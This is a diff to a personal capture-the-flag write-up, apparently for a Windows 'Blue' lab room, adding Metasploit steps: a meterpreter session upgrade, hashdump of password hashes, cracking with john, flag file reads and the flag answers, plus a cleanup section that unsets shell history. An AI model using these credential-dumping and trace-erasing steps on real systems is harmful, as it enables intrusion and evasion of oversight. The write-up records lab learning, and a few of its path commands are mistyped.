@@ -14,7 +14,7 @@
 ### Nmap
 **Command:**
 ```bash
-nmap -sVC -T4 -p- --open 10.10.241.158 -oN blue.nmap
+nmap -sVC -T4 -p- --open <ip>-oN blue.nmap
 ```
 
 **Result Summary:**
@@ -96,11 +96,55 @@ Then ran "search shell_to_meterpreter" - to have a stable meterpreter session
 use 0 - to choose the exploit
 sessions -l - to list the shells that we have.
 set session 1
-run
+run - This upgrades the session
+```
+The session will look like it dropped, if you see 'stopping exploit/multi/handlder' it did not crash, instead run the following.
+
+```bash
+
+session 2 - this selects the upgraded session
+
+```
+
+We can see that our process ID belongs to powershell.exe and is running as NT AUTHORITY\SYSTEM.
+
+then run:
+
+```bash
+
+hashdump
+
+```
+
+We can crack this hash using john with the following command after adding the hash (we just need the last part of the hash after the last “:”) to a file called “hash.txt” for the user Jon.
+
+```bash
+
+echo <hash> > hash.txt
+
+```
+
+Then now we have a password.
+
+Now lets get the flags:
+
+```bash
+search -f *.txt - search for all the flags
+
 ```
 
 ```bash
 
+cat "C:\\flag1.txt"
+
+```
+
+```bash
+cat 'c:\Windows\System32\config\flag2.txt"
+```
+
+```bash
+cat 'c:\\Windows\\System32\\config\\flag2.txt\"
 ```
 
 ## Post Exploitation
@@ -112,8 +156,9 @@ cat /etc/passwd
 ```
 
 ### File Discovery
-- User flag location:
-- Root flag location:
+Flag 1 location: C:\flag1.txt
+Flag 2 location: c:\Windows\System32\config\flag2.txt
+Flag 3 location: c:\Users\Jon\Documents\flag3.txt
 
 ---
 
@@ -131,14 +176,15 @@ sudo -l
 
 ## Flags
 
-- **User Flag:** 
-- **Root Flag:** 
+- **Flag 1** flag{access_the_machine}
+- **Flag 2** flag{sam_database_elevated_access}
+- **Flag 3** flag{admin_documents_can_be_valuable}
 
 ---
 
 ## Lessons Learned
-- 
-- 
+- I've learned sometimes if you have a firewall setup on your machine that you will need to allow list the ports that your room is using to connect back to your machine.
+- Within the upgraded shell, you sometimes need to use a double "\\" for the absolute filepath to "cat" out the file contents of files.
 - 
 
 ---
@@ -148,3 +194,10 @@ sudo -l
 rm /tmp/<filename>
 unset HISTFILE
 ```
+
+
+## Summary/Understanding of what I've learned in this room
+-
+-
+-
+--------
